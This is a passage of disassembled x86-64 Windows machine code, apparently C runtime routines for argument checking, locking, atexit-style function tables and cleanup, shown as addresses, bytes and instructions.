   14000655c:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006562:	e8 b9 10 00 00       	call   0x140007620
   140006567:	b8 16 00 00 00       	mov    $0x16,%eax
   14000656c:	48 83 c4 28          	add    $0x28,%rsp
   140006570:	c3                   	ret
   140006571:	cc                   	int3
   140006572:	cc                   	int3
   140006573:	cc                   	int3
   140006574:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006579:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000657e:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006583:	57                   	push   %rdi
   140006584:	48 83 ec 30          	sub    $0x30,%rsp
   140006588:	49 8b f9             	mov    %r9,%rdi
   14000658b:	8b 0a                	mov    (%rdx),%ecx
   14000658d:	e8 46 18 00 00       	call   0x140007dd8
   140006592:	90                   	nop
   140006593:	48 8d 1d 96 4f 01 00 	lea    0x14f96(%rip),%rbx        # 0x14001b530
   14000659a:	48 8d 35 bf 3a 01 00 	lea    0x13abf(%rip),%rsi        # 0x14001a060
   1400065a1:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400065a6:	48 8d 05 8b 4f 01 00 	lea    0x14f8b(%rip),%rax        # 0x14001b538
   1400065ad:	48 3b d8             	cmp    %rax,%rbx
   1400065b0:	74 19                	je     0x1400065cb
   1400065b2:	48 39 33             	cmp    %rsi,(%rbx)
   1400065b5:	74 0e                	je     0x1400065c5
   1400065b7:	48 8b d6             	mov    %rsi,%rdx
   1400065ba:	48 8b cb             	mov    %rbx,%rcx
   1400065bd:	e8 ba 40 00 00       	call   0x14000a67c
   1400065c2:	48 89 03             	mov    %rax,(%rbx)
   1400065c5:	48 83 c3 08          	add    $0x8,%rbx
   1400065c9:	eb d6                	jmp    0x1400065a1
   1400065cb:	8b 0f                	mov    (%rdi),%ecx
   1400065cd:	e8 5a 18 00 00       	call   0x140007e2c
   1400065d2:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400065d7:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400065dc:	48 83 c4 30          	add    $0x30,%rsp
   1400065e0:	5f                   	pop    %rdi
   1400065e1:	c3                   	ret
   1400065e2:	cc                   	int3
   1400065e3:	cc                   	int3
   1400065e4:	b8 01 00 00 00       	mov    $0x1,%eax
   1400065e9:	87 05 4d 4d 01 00    	xchg   %eax,0x14d4d(%rip)        # 0x14001b33c
   1400065ef:	c3                   	ret
   1400065f0:	4c 8b dc             	mov    %rsp,%r11
   1400065f3:	48 83 ec 28          	sub    $0x28,%rsp
   1400065f7:	b8 04 00 00 00       	mov    $0x4,%eax
   1400065fc:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140006600:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140006604:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140006608:	49 8d 53 18          	lea    0x18(%r11),%rdx
   14000660c:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140006610:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140006614:	e8 5b ff ff ff       	call   0x140006574
   140006619:	48 83 c4 28          	add    $0x28,%rsp
   14000661d:	c3                   	ret
   14000661e:	cc                   	int3
   14000661f:	cc                   	int3
   140006620:	40 53                	rex push %rbx
   140006622:	48 83 ec 20          	sub    $0x20,%rsp
   140006626:	8b d9                	mov    %ecx,%ebx
   140006628:	e8 37 0b 00 00       	call   0x140007164
   14000662d:	44 8b 80 a8 03 00 00 	mov    0x3a8(%rax),%r8d
   140006634:	41 8b d0             	mov    %r8d,%edx
   140006637:	80 e2 02             	and    $0x2,%dl
   14000663a:	f6 da                	neg    %dl
   14000663c:	1b c9                	sbb    %ecx,%ecx
   14000663e:	83 fb ff             	cmp    $0xffffffff,%ebx
   140006641:	74 36                	je     0x140006679
   140006643:	85 db                	test   %ebx,%ebx
   140006645:	74 39                	je     0x140006680
   140006647:	83 fb 01             	cmp    $0x1,%ebx
   14000664a:	74 20                	je     0x14000666c
   14000664c:	83 fb 02             	cmp    $0x2,%ebx
   14000664f:	74 15                	je     0x140006666
   140006651:	e8 ea 10 00 00       	call   0x140007740
   140006656:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000665c:	e8 bf 0f 00 00       	call   0x140007620
   140006661:	83 c8 ff             	or     $0xffffffff,%eax
   140006664:	eb 1d                	jmp    0x140006683
   140006666:	41 83 e0 fd          	and    $0xfffffffd,%r8d
   14000666a:	eb 04                	jmp    0x140006670
   14000666c:	41 83 c8 02          	or     $0x2,%r8d
   140006670:	44 89 80 a8 03 00 00 	mov    %r8d,0x3a8(%rax)
   140006677:	eb 07                	jmp    0x140006680
   140006679:	83 0d 30 41 01 00 ff 	orl    $0xffffffff,0x14130(%rip)        # 0x14001a7b0
   140006680:	8d 41 02             	lea    0x2(%rcx),%eax
   140006683:	48 83 c4 20          	add    $0x20,%rsp
   140006687:	5b                   	pop    %rbx
   140006688:	c3                   	ret
   140006689:	cc                   	int3
   14000668a:	cc                   	int3
   14000668b:	cc                   	int3
   14000668c:	8b 05 ae 4c 01 00    	mov    0x14cae(%rip),%eax        # 0x14001b340
   140006692:	c3                   	ret
   140006693:	cc                   	int3
   140006694:	48 83 ec 28          	sub    $0x28,%rsp
   140006698:	83 f9 01             	cmp    $0x1,%ecx
   14000669b:	76 15                	jbe    0x1400066b2
   14000669d:	e8 9e 10 00 00       	call   0x140007740
   1400066a2:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400066a8:	e8 73 0f 00 00       	call   0x140007620
   1400066ad:	83 c8 ff             	or     $0xffffffff,%eax
   1400066b0:	eb 08                	jmp    0x1400066ba
   1400066b2:	87 0d 88 4c 01 00    	xchg   %ecx,0x14c88(%rip)        # 0x14001b340
   1400066b8:	8b c1                	mov    %ecx,%eax
   1400066ba:	48 83 c4 28          	add    $0x28,%rsp
   1400066be:	c3                   	ret
   1400066bf:	cc                   	int3
   1400066c0:	48 8d 05 7d 4c 01 00 	lea    0x14c7d(%rip),%rax        # 0x14001b344
   1400066c7:	c3                   	ret
   1400066c8:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%rsp)
   1400066cf:	00 
   1400066d0:	8b 44 24 10          	mov    0x10(%rsp),%eax
   1400066d4:	e9 47 18 00 00       	jmp    0x140007f20
   1400066d9:	cc                   	int3
   1400066da:	cc                   	int3
   1400066db:	cc                   	int3
   1400066dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400066e1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400066e6:	57                   	push   %rdi
   1400066e7:	48 83 ec 20          	sub    $0x20,%rsp
   1400066eb:	49 8b d9             	mov    %r9,%rbx
   1400066ee:	49 8b f8             	mov    %r8,%rdi
   1400066f1:	8b 0a                	mov    (%rdx),%ecx
   1400066f3:	e8 e0 16 00 00       	call   0x140007dd8
   1400066f8:	90                   	nop
   1400066f9:	48 8b cf             	mov    %rdi,%rcx
   1400066fc:	e8 53 00 00 00       	call   0x140006754
   140006701:	8b f8                	mov    %eax,%edi
   140006703:	8b 0b                	mov    (%rbx),%ecx
   140006705:	e8 22 17 00 00       	call   0x140007e2c
   14000670a:	8b c7                	mov    %edi,%eax
   14000670c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006711:	48 83 c4 20          	add    $0x20,%rsp
   140006715:	5f                   	pop    %rdi
   140006716:	c3                   	ret
   140006717:	cc                   	int3
   140006718:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000671d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006722:	57                   	push   %rdi
   140006723:	48 83 ec 20          	sub    $0x20,%rsp
   140006727:	49 8b d9             	mov    %r9,%rbx
   14000672a:	49 8b f8             	mov    %r8,%rdi
   14000672d:	8b 0a                	mov    (%rdx),%ecx
   14000672f:	e8 a4 16 00 00       	call   0x140007dd8
   140006734:	90                   	nop
   140006735:	48 8b cf             	mov    %rdi,%rcx
   140006738:	e8 c7 01 00 00       	call   0x140006904
   14000673d:	8b f8                	mov    %eax,%edi
   14000673f:	8b 0b                	mov    (%rbx),%ecx
   140006741:	e8 e6 16 00 00       	call   0x140007e2c
   140006746:	8b c7                	mov    %edi,%eax
   140006748:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000674d:	48 83 c4 20          	add    $0x20,%rsp
   140006751:	5f                   	pop    %rdi
   140006752:	c3                   	ret
   140006753:	cc                   	int3
   140006754:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006759:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000675e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140006763:	57                   	push   %rdi
   140006764:	41 56                	push   %r14
   140006766:	41 57                	push   %r15
   140006768:	48 83 ec 20          	sub    $0x20,%rsp
   14000676c:	48 8b 01             	mov    (%rcx),%rax
   14000676f:	33 ed                	xor    %ebp,%ebp
   140006771:	4c 8b f9             	mov    %rcx,%r15
   140006774:	48 8b 18             	mov    (%rax),%rbx
   140006777:	48 85 db             	test   %rbx,%rbx
   14000677a:	0f 84 68 01 00 00    	je     0x1400068e8
   140006780:	4c 8b 15 79 38 01 00 	mov    0x13879(%rip),%r10        # 0x14001a000
   140006787:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   14000678b:	49 8b f2             	mov    %r10,%rsi
   14000678e:	48 33 33             	xor    (%rbx),%rsi
   140006791:	4d 33 ca             	xor    %r10,%r9
   140006794:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140006798:	41 8b ca             	mov    %r10d,%ecx
   14000679b:	83 e1 3f             	and    $0x3f,%ecx
   14000679e:	49 33 da             	xor    %r10,%rbx
   1400067a1:	48 d3 cb             	ror    %cl,%rbx
   1400067a4:	48 d3 ce             	ror    %cl,%rsi
   1400067a7:	49 d3 c9             	ror    %cl,%r9
   1400067aa:	4c 3b cb             	cmp    %rbx,%r9
   1400067ad:	0f 85 a7 00 00 00    	jne    0x14000685a
   1400067b3:	48 2b de             	sub    %rsi,%rbx
   1400067b6:	b8 00 02 00 00       	mov    $0x200,%eax
   1400067bb:	48 c1 fb 03          	sar    $0x3,%rbx
   1400067bf:	48 3b d8             	cmp    %rax,%rbx
   1400067c2:	48 8b fb             	mov    %rbx,%rdi
   1400067c5:	48 0f 47 f8          	cmova  %rax,%rdi
   1400067c9:	8d 45 20             	lea    0x20(%rbp),%eax
   1400067cc:	48 03 fb             	add    %rbx,%rdi
   1400067cf:	48 0f 44 f8          	cmove  %rax,%rdi
   1400067d3:	48 3b fb             	cmp    %rbx,%rdi
   1400067d6:	72 1e                	jb     0x1400067f6
   1400067d8:	44 8d 45 08          	lea    0x8(%rbp),%r8d
   1400067dc:	48 8b d7             	mov    %rdi,%rdx
   1400067df:	48 8b ce             	mov    %rsi,%rcx
   1400067e2:	e8 fd 3e 00 00       	call   0x14000a6e4
   1400067e7:	33 c9                	xor    %ecx,%ecx
   1400067e9:	4c 8b f0             	mov    %rax,%r14
   1400067ec:	e8 2f 17 00 00       	call   0x140007f20
   1400067f1:	4d 85 f6             	test   %r14,%r14
   1400067f4:	75 28                	jne    0x14000681e
   1400067f6:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   1400067fa:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140006800:	48 8b d7             	mov    %rdi,%rdx
   140006803:	48 8b ce             	mov    %rsi,%rcx
   140006806:	e8 d9 3e 00 00       	call   0x14000a6e4
   14000680b:	33 c9                	xor    %ecx,%ecx
   14000680d:	4c 8b f0             	mov    %rax,%r14
   140006810:	e8 0b 17 00 00       	call   0x140007f20
   140006815:	4d 85 f6             	test   %r14,%r14
   140006818:	0f 84 ca 00 00 00    	je     0x1400068e8
   14000681e:	4c 8b 15 db 37 01 00 	mov    0x137db(%rip),%r10        # 0x14001a000
   140006825:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   140006829:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   14000682d:	49 8b f6             	mov    %r14,%rsi
   140006830:	48 8b cb             	mov    %rbx,%rcx
   140006833:	49 2b c9             	sub    %r9,%rcx
   140006836:	48 83 c1 07          	add    $0x7,%rcx
   14000683a:	48 c1 e9 03          	shr    $0x3,%rcx
   14000683e:	4c 3b cb             	cmp    %rbx,%r9
   140006841:	48 0f 47 cd          	cmova  %rbp,%rcx
   140006845:	48 85 c9             	test   %rcx,%rcx
   140006848:	74 10                	je     0x14000685a
   14000684a:	49 8b c2             	mov    %r10,%rax
   14000684d:	49 8b f9             	mov    %r9,%rdi
   140006850:	f3 48 ab             	rep stos %rax,(%rdi)
   140006853:	4c 8b 15 a6 37 01 00 	mov    0x137a6(%rip),%r10        # 0x14001a000
   14000685a:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140006860:	49 8d 79 08          	lea    0x8(%r9),%rdi
   140006864:	41 8b c8             	mov    %r8d,%ecx
   140006867:	41 8b c2             	mov    %r10d,%eax
   14000686a:	83 e0 3f             	and    $0x3f,%eax
   14000686d:	2b c8                	sub    %eax,%ecx
   14000686f:	49 8b 47 08          	mov    0x8(%r15),%rax
   140006873:	48 8b 10             	mov    (%rax),%rdx
   140006876:	41 8b c0             	mov    %r8d,%eax
   140006879:	48 d3 ca             	ror    %cl,%rdx
   14000687c:	49 33 d2             	xor    %r10,%rdx
   14000687f:	49 89 11             	mov    %rdx,(%r9)
   140006882:	48 8b 15 77 37 01 00 	mov    0x13777(%rip),%rdx        # 0x14001a000
   140006889:	8b ca                	mov    %edx,%ecx
   14000688b:	83 e1 3f             	and    $0x3f,%ecx
   14000688e:	2b c1                	sub    %ecx,%eax
   140006890:	8a c8                	mov    %al,%cl
   140006892:	49 8b 07             	mov    (%r15),%rax
   140006895:	48 d3 ce             	ror    %cl,%rsi
   140006898:	48 33 f2             	xor    %rdx,%rsi
   14000689b:	48 8b 08             	mov    (%rax),%rcx
   14000689e:	48 89 31             	mov    %rsi,(%rcx)
   1400068a1:	41 8b c8             	mov    %r8d,%ecx
   1400068a4:	48 8b 15 55 37 01 00 	mov    0x13755(%rip),%rdx        # 0x14001a000
   1400068ab:	8b c2                	mov    %edx,%eax
   1400068ad:	83 e0 3f             	and    $0x3f,%eax
   1400068b0:	2b c8                	sub    %eax,%ecx
   1400068b2:	49 8b 07             	mov    (%r15),%rax
   1400068b5:	48 d3 cf             	ror    %cl,%rdi
   1400068b8:	48 33 fa             	xor    %rdx,%rdi
   1400068bb:	48 8b 10             	mov    (%rax),%rdx
   1400068be:	48 89 7a 08          	mov    %rdi,0x8(%rdx)
   1400068c2:	48 8b 15 37 37 01 00 	mov    0x13737(%rip),%rdx        # 0x14001a000
   1400068c9:	8b c2                	mov    %edx,%eax
   1400068cb:	83 e0 3f             	and    $0x3f,%eax
   1400068ce:	44 2b c0             	sub    %eax,%r8d
   1400068d1:	49 8b 07             	mov    (%r15),%rax
   1400068d4:	41 8a c8             	mov    %r8b,%cl
   1400068d7:	48 d3 cb             	ror    %cl,%rbx
   1400068da:	48 33 da             	xor    %rdx,%rbx
   1400068dd:	48 8b 08             	mov    (%rax),%rcx
   1400068e0:	33 c0                	xor    %eax,%eax
   1400068e2:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   1400068e6:	eb 03                	jmp    0x1400068eb
   1400068e8:	83 c8 ff             	or     $0xffffffff,%eax
   1400068eb:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400068f0:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   1400068f5:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400068fa:	48 83 c4 20          	add    $0x20,%rsp
   1400068fe:	41 5f                	pop    %r15
   140006900:	41 5e                	pop    %r14
   140006902:	5f                   	pop    %rdi
   140006903:	c3                   	ret
   140006904:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006909:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000690e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006913:	57                   	push   %rdi
   140006914:	41 56                	push   %r14
   140006916:	41 57                	push   %r15
   140006918:	48 83 ec 20          	sub    $0x20,%rsp
   14000691c:	48 8b 01             	mov    (%rcx),%rax
   14000691f:	48 8b f1             	mov    %rcx,%rsi
   140006922:	48 8b 18             	mov    (%rax),%rbx
   140006925:	48 85 db             	test   %rbx,%rbx
   140006928:	75 08                	jne    0x140006932
   14000692a:	83 c8 ff             	or     $0xffffffff,%eax
   14000692d:	e9 cf 00 00 00       	jmp    0x140006a01
   140006932:	4c 8b 05 c7 36 01 00 	mov    0x136c7(%rip),%r8        # 0x14001a000
   140006939:	41 8b c8             	mov    %r8d,%ecx
   14000693c:	49 8b f8             	mov    %r8,%rdi
   14000693f:	48 33 3b             	xor    (%rbx),%rdi
   140006942:	83 e1 3f             	and    $0x3f,%ecx
   140006945:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140006949:	48 d3 cf             	ror    %cl,%rdi
   14000694c:	49 33 d8             	xor    %r8,%rbx
   14000694f:	48 d3 cb             	ror    %cl,%rbx
   140006952:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   140006956:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   14000695a:	0f 87 9f 00 00 00    	ja     0x1400069ff
   140006960:	41 8b c8             	mov    %r8d,%ecx
   140006963:	4d 8b f0             	mov    %r8,%r14
   140006966:	83 e1 3f             	and    $0x3f,%ecx
   140006969:	4c 8b ff             	mov    %rdi,%r15
   14000696c:	48 8b eb             	mov    %rbx,%rbp
   14000696f:	48 83 eb 08          	sub    $0x8,%rbx
   140006973:	48 3b df             	cmp    %rdi,%rbx
   140006976:	72 55                	jb     0x1400069cd
   140006978:	48 8b 03             	mov    (%rbx),%rax
   14000697b:	49 3b c6             	cmp    %r14,%rax
   14000697e:	74 ef                	je     0x14000696f
   140006980:	49 33 c0             	xor    %r8,%rax
   140006983:	4c 89 33             	mov    %r14,(%rbx)
   140006986:	48 d3 c8             	ror    %cl,%rax
   140006989:	ff 15 c9 8a 00 00    	call   *0x8ac9(%rip)        # 0x14000f458
   14000698f:	4c 8b 05 6a 36 01 00 	mov    0x1366a(%rip),%r8        # 0x14001a000
   140006996:	48 8b 06             	mov    (%rsi),%rax
   140006999:	41 8b c8             	mov    %r8d,%ecx
   14000699c:	83 e1 3f             	and    $0x3f,%ecx
   14000699f:	48 8b 10             	mov    (%rax),%rdx
   1400069a2:	4c 8b 0a             	mov    (%rdx),%r9
   1400069a5:	48 8b 42 08          	mov    0x8(%rdx),%rax
   1400069a9:	4d 33 c8             	xor    %r8,%r9
   1400069ac:	49 33 c0             	xor    %r8,%rax
   1400069af:	49 d3 c9             	ror    %cl,%r9
   1400069b2:	48 d3 c8             	ror    %cl,%rax
   1400069b5:	4d 3b cf             	cmp    %r15,%r9
   1400069b8:	75 05                	jne    0x1400069bf
   1400069ba:	48 3b c5             	cmp    %rbp,%rax
   1400069bd:	74 b0                	je     0x14000696f
   1400069bf:	4d 8b f9             	mov    %r9,%r15
   1400069c2:	49 8b f9             	mov    %r9,%rdi
   1400069c5:	48 8b e8             	mov    %rax,%rbp
   1400069c8:	48 8b d8             	mov    %rax,%rbx
   1400069cb:	eb a2                	jmp    0x14000696f
   1400069cd:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   1400069d1:	74 0f                	je     0x1400069e2
   1400069d3:	48 8b cf             	mov    %rdi,%rcx
   1400069d6:	e8 45 15 00 00       	call   0x140007f20
   1400069db:	4c 8b 05 1e 36 01 00 	mov    0x1361e(%rip),%r8        # 0x14001a000
   1400069e2:	48 8b 06             	mov    (%rsi),%rax
   1400069e5:	48 8b 08             	mov    (%rax),%rcx
   1400069e8:	4c 89 01             	mov    %r8,(%rcx)
   1400069eb:	48 8b 06             	mov    (%rsi),%rax
   1400069ee:	48 8b 08             	mov    (%rax),%rcx
   1400069f1:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   1400069f5:	48 8b 06             	mov    (%rsi),%rax
   1400069f8:	48 8b 08             	mov    (%rax),%rcx
   1400069fb:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   1400069ff:	33 c0                	xor    %eax,%eax
   140006a01:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006a06:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006a0b:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006a10:	48 83 c4 20          	add    $0x20,%rsp
   140006a14:	41 5f                	pop    %r15
   140006a16:	41 5e                	pop    %r14
   140006a18:	5f                   	pop    %rdi
   140006a19:	c3                   	ret
   140006a1a:	cc                   	int3
   140006a1b:	cc                   	int3
   140006a1c:	48 8b d1             	mov    %rcx,%rdx
   140006a1f:	48 8d 0d 22 49 01 00 	lea    0x14922(%rip),%rcx        # 0x14001b348
   140006a26:	e9 65 00 00 00       	jmp    0x140006a90
   140006a2b:	cc                   	int3
   140006a2c:	4c 8b dc             	mov    %rsp,%r11
   140006a2f:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140006a33:	48 83 ec 38          	sub    $0x38,%rsp
   140006a37:	49 8d 43 08          	lea    0x8(%r11),%rax
   140006a3b:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   140006a3f:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   140006a43:	b8 02 00 00 00       	mov    $0x2,%eax
   140006a48:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   140006a4c:	49 8d 53 20          	lea    0x20(%r11),%rdx
   140006a50:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140006a54:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   140006a58:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140006a5c:	e8 b7 fc ff ff       	call   0x140006718
   140006a61:	48 83 c4 38          	add    $0x38,%rsp
   140006a65:	c3                   	ret
   140006a66:	cc                   	int3
   140006a67:	cc                   	int3
   140006a68:	48 85 c9             	test   %rcx,%rcx
   140006a6b:	75 04                	jne    0x140006a71
   140006a6d:	83 c8 ff             	or     $0xffffffff,%eax
   140006a70:	c3                   	ret
   140006a71:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140006a75:	48 39 01             	cmp    %rax,(%rcx)
   140006a78:	75 12                	jne    0x140006a8c
   140006a7a:	48 8b 05 7f 35 01 00 	mov    0x1357f(%rip),%rax        # 0x14001a000
   140006a81:	48 89 01             	mov    %rax,(%rcx)
   140006a84:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140006a88:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140006a8c:	33 c0                	xor    %eax,%eax
   140006a8e:	c3                   	ret
   140006a8f:	cc                   	int3
   140006a90:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140006a95:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140006a9a:	55                   	push   %rbp
   140006a9b:	48 8b ec             	mov    %rsp,%rbp
   140006a9e:	48 83 ec 40          	sub    $0x40,%rsp
   140006aa2:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140006aa6:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140006aaa:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   140006aae:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140006ab2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006ab6:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140006aba:	b8 02 00 00 00       	mov    $0x2,%eax
   140006abf:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140006ac3:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140006ac7:	89 45 28             	mov    %eax,0x28(%rbp)
   140006aca:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140006acd:	e8 0a fc ff ff       	call   0x1400066dc
   140006ad2:	48 83 c4 40          	add    $0x40,%rsp
   140006ad6:	5d                   	pop    %rbp
   140006ad7:	c3                   	ret
   140006ad8:	48 8d 05 81 35 01 00 	lea    0x13581(%rip),%rax        # 0x14001a060
   140006adf:	48 89 05 4a 4a 01 00 	mov    %rax,0x14a4a(%rip)        # 0x14001b530
   140006ae6:	b0 01                	mov    $0x1,%al
   140006ae8:	c3                   	ret
   140006ae9:	cc                   	int3
   140006aea:	cc                   	int3
   140006aeb:	cc                   	int3
   140006aec:	48 83 ec 28          	sub    $0x28,%rsp
   140006af0:	48 8d 0d 51 48 01 00 	lea    0x14851(%rip),%rcx        # 0x14001b348
   140006af7:	e8 6c ff ff ff       	call   0x140006a68
   140006afc:	48 8d 0d 5d 48 01 00 	lea    0x1485d(%rip),%rcx        # 0x14001b360
   140006b03:	e8 60 ff ff ff       	call   0x140006a68
   140006b08:	b0 01                	mov    $0x1,%al
   140006b0a:	48 83 c4 28          	add    $0x28,%rsp
   140006b0e:	c3                   	ret
   140006b0f:	cc                   	int3
   140006b10:	48 83 ec 28          	sub    $0x28,%rsp
   140006b14:	e8 df f5 ff ff       	call   0x1400060f8
   140006b19:	b0 01                	mov    $0x1,%al
   140006b1b:	48 83 c4 28          	add    $0x28,%rsp
   140006b1f:	c3                   	ret
   140006b20:	40 53                	rex push %rbx
   140006b22:	48 83 ec 20          	sub    $0x20,%rsp
   140006b26:	48 8b 1d d3 34 01 00 	mov    0x134d3(%rip),%rbx        # 0x14001a000
   140006b2d:	48 8b cb             	mov    %rbx,%rcx
   140006b30:	e8 33 0a 00 00       	call   0x140007568
   140006b35:	48 8b cb             	mov    %rbx,%rcx
   140006b38:	e8 9b ed ff ff       	call   0x1400058d8
   140006b3d:	48 8b cb             	mov    %rbx,%rcx
   140006b40:	e8 93 3d 00 00       	call   0x14000a8d8
   140006b45:	48 8b cb             	mov    %rbx,%rcx
   140006b48:	e8 b3 ef ff ff       	call   0x140005b00
   140006b4d:	48 8b cb             	mov    %rbx,%rcx
   140006b50:	e8 63 f9 ff ff       	call   0x1400064b8
   140006b55:	b0 01                	mov    $0x1,%al
   140006b57:	48 83 c4 20          	add    $0x20,%rsp
   140006b5b:	5b                   	pop    %rbx
   140006b5c:	c3                   	ret
   140006b5d:	cc                   	int3
   140006b5e:	cc                   	int3
   140006b5f:	cc                   	int3
   140006b60:	33 c9                	xor    %ecx,%ecx
   140006b62:	e9 79 da ff ff       	jmp    0x1400045e0
   140006b67:	cc                   	int3
   140006b68:	40 53                	rex push %rbx
   140006b6a:	48 83 ec 20          	sub    $0x20,%rsp
   140006b6e:	48 8b 0d 13 4c 01 00 	mov    0x14c13(%rip),%rcx        # 0x14001b788
   140006b75:	83 c8 ff             	or     $0xffffffff,%eax
   140006b78:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140006b7c:	83 f8 01             	cmp    $0x1,%eax
   140006b7f:	75 1f                	jne    0x140006ba0
   140006b81:	48 8b 0d 00 4c 01 00 	mov    0x14c00(%rip),%rcx        # 0x14001b788
   140006b88:	48 8d 1d 41 36 01 00 	lea    0x13641(%rip),%rbx        # 0x14001a1d0
   140006b8f:	48 3b cb             	cmp    %rbx,%rcx
   140006b92:	74 0c                	je     0x140006ba0
   140006b94:	e8 87 13 00 00       	call   0x140007f20
   140006b99:	48 89 1d e8 4b 01 00 	mov    %rbx,0x14be8(%rip)        # 0x14001b788
   140006ba0:	b0 01                	mov    $0x1,%al
   140006ba2:	48 83 c4 20          	add    $0x20,%rsp
   140006ba6:	5b                   	pop    %rbx
   140006ba7:	c3                   	ret
   140006ba8:	48 83 ec 28          	sub    $0x28,%rsp
   140006bac:	48 8b 0d 65 50 01 00 	mov    0x15065(%rip),%rcx        # 0x14001bc18
   140006bb3:	e8 68 13 00 00       	call   0x140007f20
   140006bb8:	48 8b 0d 61 50 01 00 	mov    0x15061(%rip),%rcx        # 0x14001bc20
   140006bbf:	48 83 25 51 50 01 00 	andq   $0x0,0x15051(%rip)        # 0x14001bc18
   140006bc6:	00 
   140006bc7:	e8 54 13 00 00       	call   0x140007f20
   140006bcc:	48 8b 0d d5 4b 01 00 	mov    0x14bd5(%rip),%rcx        # 0x14001b7a8
   140006bd3:	48 83 25 45 50 01 00 	andq   $0x0,0x15045(%rip)        # 0x14001bc20
   140006bda:	00 
   140006bdb:	e8 40 13 00 00       	call   0x140007f20
   140006be0:	48 8b 0d c9 4b 01 00 	mov    0x14bc9(%rip),%rcx        # 0x14001b7b0
   140006be7:	48 83 25 b9 4b 01 00 	andq   $0x0,0x14bb9(%rip)        # 0x14001b7a8
   140006bee:	00 
   140006bef:	e8 2c 13 00 00       	call   0x140007f20
   140006bf4:	48 83 25 b4 4b 01 00 	andq   $0x0,0x14bb4(%rip)        # 0x14001b7b0
   140006bfb:	00 
   140006bfc:	b0 01                	mov    $0x1,%al
   140006bfe:	48 83 c4 28          	add    $0x28,%rsp
   140006c02:	c3                   	ret
   140006c03:	cc                   	int3
   140006c04:	48 8d 15 f5 9a 00 00 	lea    0x9af5(%rip),%rdx        # 0x140010700
   140006c0b:	48 8d 0d ee 99 00 00 	lea    0x99ee(%rip),%rcx        # 0x140010600
   140006c12:	e9 8d 3b 00 00       	jmp    0x14000a7a4
   140006c17:	cc                   	int3
   140006c18:	48 83 ec 28          	sub    $0x28,%rsp
   140006c1c:	84 c9                	test   %cl,%cl
   140006c1e:	74 16                	je     0x140006c36
   140006c20:	48 83 3d e8 4f 01 00 	cmpq   $0x0,0x14fe8(%rip)        # 0x14001bc10
   140006c27:	00 
   140006c28:	74 05                	je     0x140006c2f
   140006c2a:	e8 d9 41 00 00       	call   0x14000ae08
   140006c2f:	b0 01                	mov    $0x1,%al
   140006c31:	48 83 c4 28          	add    $0x28,%rsp
   140006c35:	c3                   	ret
   140006c36:	48 8d 15 c3 9a 00 00 	lea    0x9ac3(%rip),%rdx        # 0x140010700
